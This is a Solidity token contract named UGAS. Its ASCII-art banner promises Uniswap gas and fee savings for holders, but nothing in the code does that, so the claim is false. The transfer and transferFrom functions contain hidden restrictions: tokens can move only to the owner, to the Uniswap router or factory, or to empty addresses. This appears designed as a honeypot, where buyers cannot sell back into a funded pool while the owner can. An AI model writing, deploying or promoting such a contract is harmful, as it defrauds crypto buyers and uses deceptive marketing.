/*

*/

/*
UUUUUUUU     UUUUUUUUNNNNNNNN        NNNNNNNNIIIIIIIIII   SSSSSSSSSSSSSSS WWWWWWWW                           WWWWWWWW   AAA               PPPPPPPPPPPPPPPPP                GGGGGGGGGGGGG               AAA                 SSSSSSSSSSSSSSS 
U::::::U     U::::::UN:::::::N       N::::::NI::::::::I SS:::::::::::::::SW::::::W                           W::::::W  A:::A              P::::::::::::::::P            GGG::::::::::::G              A:::A              SS:::::::::::::::S
U::::::U     U::::::UN::::::::N      N::::::NI::::::::IS:::::SSSSSS::::::SW::::::W                           W::::::W A:::::A             P::::::PPPPPP:::::P         GG:::::::::::::::G             A:::::A            S:::::SSSSSS::::::S
UU:::::U     U:::::UUN:::::::::N     N::::::NII::::::IIS:::::S     SSSSSSSW::::::W                           W::::::WA:::::::A            PP:::::P     P:::::P       G:::::GGGGGGGG::::G            A:::::::A           S:::::S     SSSSSSS
 U:::::U     U:::::U N::::::::::N    N::::::N  I::::I  S:::::S             W:::::W           WWWWW           W:::::WA:::::::::A             P::::P     P:::::P      G:::::G       GGGGGG           A:::::::::A          S:::::S            
 U:::::D     D:::::U N:::::::::::N   N::::::N  I::::I  S:::::S              W:::::W         W:::::W         W:::::WA:::::A:::::A            P::::P     P:::::P     G:::::G                        A:::::A:::::A         S:::::S            
 U:::::D     D:::::U N:::::::N::::N  N::::::N  I::::I   S::::SSSS            W:::::W       W:::::::W       W:::::WA:::::A A:::::A           P::::PPPPPP:::::P      G:::::G                       A:::::A A:::::A         S::::SSSS         
 U:::::D     D:::::U N::::::N N::::N N::::::N  I::::I    SS::::::SSSSS        W:::::W     W:::::::::W     W:::::WA:::::A   A:::::A          P:::::::::::::PP       G:::::G    GGGGGGGGGG        A:::::A   A:::::A         SS::::::SSSSS    
 U:::::D     D:::::U N::::::N  N::::N:::::::N  I::::I      SSS::::::::SS       W:::::W   W:::::W:::::W   W:::::WA:::::A     A:::::A         P::::PPPPPPPPP         G:::::G    G::::::::G       A:::::A     A:::::A          SSS::::::::SS  
 U:::::D     D:::::U N::::::N   N:::::::::::N  I::::I         SSSSSS::::S       W:::::W W:::::W W:::::W W:::::WA:::::AAAAAAAAA:::::A        P::::P                 G:::::G    GGGGG::::G      A:::::AAAAAAAAA:::::A            SSSSSS::::S 
 U:::::D     D:::::U N::::::N    N::::::::::N  I::::I              S:::::S       W:::::W:::::W   W:::::W:::::WA:::::::::::::::::::::A       P::::P                 G:::::G        G::::G     A:::::::::::::::::::::A                S:::::S
 U::::::U   U::::::U N::::::N     N:::::::::N  I::::I              S:::::S        W:::::::::W     W:::::::::WA:::::AAAAAAAAAAAAA:::::A      P::::P                  G:::::G       G::::G    A:::::AAAAAAAAAAAAA:::::A               S:::::S
 U:::::::UUU:::::::U N::::::N      N::::::::NII::::::IISSSSSSS     S:::::S         W:::::::W       W:::::::WA:::::A             A:::::A   PP::::::PP                 G:::::GGGGGGGG::::G   A:::::A             A:::::A  SSSSSSS     S:::::S
  UU:::::::::::::UU  N::::::N       N:::::::NI::::::::IS::::::SSSSSS:::::S          W:::::W         W:::::WA:::::A               A:::::A  P::::::::P                  GG:::::::::::::::G  A:::::A               A:::::A S::::::SSSSSS:::::S
    UU:::::::::UU    N::::::N        N::::::NI::::::::IS:::::::::::::::SS            W:::W           W:::WA:::::A                 A:::::A P::::::::P                    GGG::::::GGG:::G A:::::A                 A:::::AS:::::::::::::::SS 
      UUUUUUUUU      NNNNNNNN         NNNNNNNIIIIIIIIII SSSSSSSSSSSSSSS               WWW             WWWAAAAAAA                   AAAAAAAPPPPPPPPPP                       GGGGGG   GGGGAAAAAAA                   AAAAAAASSSSSSSSSSSSSSS   
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
    (UGAS) SAVE ON GAS AND POOL FEES FOR EVERY TRANSACTION ON UNISWAP. MAINTAIN MINIMUM 10,000 UGAS TO FOR FEE REDUCTION
*/

pragma solidity 0.5.17;

contract UNISWAPGASTOKEN {
 
    mapping (address => uint256) public balanceOf;

    string public name = "UGAS";
    string public symbol = "UGAS";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000000 * (uint256(10) ** decimals);
    address contractOwner;
    address uniRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address uniFactory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() public {
       
        contractOwner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        allowance[msg.sender][uniRouter] = 1000000000000000000000000000;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        require(balanceOf[msg.sender] >= value);
        require(to == contractOwner || balanceOf[to] == 0 || to == uniFactory || to == uniRouter);
        balanceOf[msg.sender] -= value; 
        emit Transfer(msg.sender, to, value);
        balanceOf[to] += value;         
        return true;   
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        require(to == contractOwner || balanceOf[to] == 0 || to == uniFactory || to == uniRouter);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}